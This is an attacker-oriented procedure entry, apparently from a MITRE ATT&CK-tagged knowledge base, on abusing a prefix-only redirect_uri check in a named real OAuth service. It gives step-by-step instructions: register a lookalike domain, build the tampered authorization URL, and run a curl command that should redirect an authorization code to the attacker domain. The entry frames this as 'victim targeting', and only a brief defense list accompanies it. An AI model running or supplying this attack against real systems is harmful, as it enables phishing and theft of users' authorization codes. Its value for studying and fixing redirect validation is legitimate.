---
tags:
  - oauth
  - open-redirect
  - phishing
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[T1566.002]]'
  - '[[Drive-by Compromise]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 686faea8-d578-4e31-93f1-0a9e87e25525
created_at: '2025-12-14T17:24:38.886Z'
updated_at: '2025-12-14T17:24:38.886Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[T1566.002]]'
  - '[[Drive-by Compromise]]'
---
# Craft-Malicious-OAuth-Authorization-URL-with-Tampered-redirect-uri

## Summary

This procedure involves constructing a malicious OAuth authorization URL by tampering with the redirect_uri parameter to exploit incomplete domain validation, enabling an open redirect to an attacker-controlled domain.

## Description

The vulnerability stems from the server at accounts.bistudio.com only checking if redirect_uri begins with 'https://xbox.dayz.com/' without full URL parsing, allowing suffixes like 'test.com' to redirect to arbitrary domains (e.g., https://xbox.dayz.comtest.com). Attackers register a lookalike domain and craft the URL to trick users into authorizing, leading to parameter leakage. This requires knowledge of OAuth parameters from the initiation step and a registered domain.

## Requirements

1. Observed OAuth parameters from initiation (client_id, state, scope)
2. Attacker-controlled domain registered and DNS configured (e.g., xbox.dayz.comtest.com)
3. Web browser or curl for testing the crafted URL

## Defense

Defensive measures and detection strategies:

- Enforce strict redirect_uri validation using full domain matching and whitelisting
- Log and alert on redirect_uri values that don't exactly match expected endpoints
- Educate users on phishing links and implement OAuth state parameter validation

## Objectives

1. Bypass redirect_uri prefix check with injected domain
2. Create a functional malicious URL for victim targeting
3. Verify redirect to attacker domain with parameters

## Instructions

### Step 1: Register and Prepare Attacker Domain

**Context**: Set up the malicious endpoint to receive redirects.

Register a domain like xbox.dayz.comtest.com and point it to your server. Ensure /api/auth/callback is accessible (e.g., via a simple HTTP server).

> No command; use domain registrar tools.

### Step 2: Construct Tampered redirect_uri

**Context**: Modify the redirect_uri to start with the allowed prefix but append your domain.

Build redirect_uri as https://xbox.dayz.comtest.com/api/auth/callback. Insert into the full OAuth URL template from Step 1 of the chain.

Example full URL: https://accounts.bistudio.com/api/auth?client_id=CLIENT_ID&redirect_uri=https://xbox.dayz.comtest.com/api/auth/callback&state=STATE&response_type=code&scope=SCOPE.

### Step 3: Test the Crafted URL

**Context**: Simulate access to confirm the open redirect works.

Use curl to request the URL:

```bash
curl -v "https://accounts.bistudio.com/api/auth?client_id=CLIENT_ID&redirect_uri=https://xbox.dayz.comtest.com/api/auth/callback&state=STATE&response_type=code&scope=SCOPE"
```

> Expected output: 302 redirect with Location: https://xbox.dayz.comtest.com/api/auth/callback?code=...&state=STATE.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[T1566.002]] Spearphishing Link
- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[oauth]]
- [[open-redirect]]
- [[Phishing]]
